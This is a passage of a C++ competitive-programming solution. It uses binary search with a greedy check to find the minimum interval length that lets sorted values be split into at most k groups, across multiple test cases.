 #define allr(v) ((v).rbegin()), ((v).rend())
 #define updmax(a,b) a=max(a,b)
 #define updmin(a,b) a=min(a,b)
 #define ceil(a,b) ((a/b)+(a%b?1:0))
 /* asc -> 1 2 3 ,des -> 3 2 1 */

 /***********************************************************************************/
 using namespace std;
 void Rofyda_Elghadban(){
  #ifndef ONLINE_JUDGE   
    freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout);
   #endif
    ios_base::sync_with_stdio(false), cin.tie(nullptr), cout.tie(nullptr);
 }

 bool BS(ll n,ll k,vector<ll>&v,ll s){
  ll temp=v[0]+s;
  int counter=1;
  for(int i=1;i<n;i++){
    if(v[i]>=temp){
      temp=v[i]+s;
      counter++;
    }else{
      continue;
    }
  }
  if(counter<=k){
    return true;
  }else{
    return false;
  }
 }

 void solve(){
  ll n,k;
  cin>>n>>k;
  vector<ll>v(n);
  cin(v);
  ll l=0,r=1e9,ans=0;
  while(l<=r){
    ll mid=l+(r-l)/2;
    if(BS(n,k,v,mid)){
      ans=mid;
      r=mid-1;
    }else{
      l=mid+1;
    }
  }
  cout<<ans<<""\n"";
 }

 int main(){
  Rofyda_Elghadban(); 
  int t;
  cin>>t;
  while(t--){
    solve();
  }
  // solve();
  return 0;
 }"
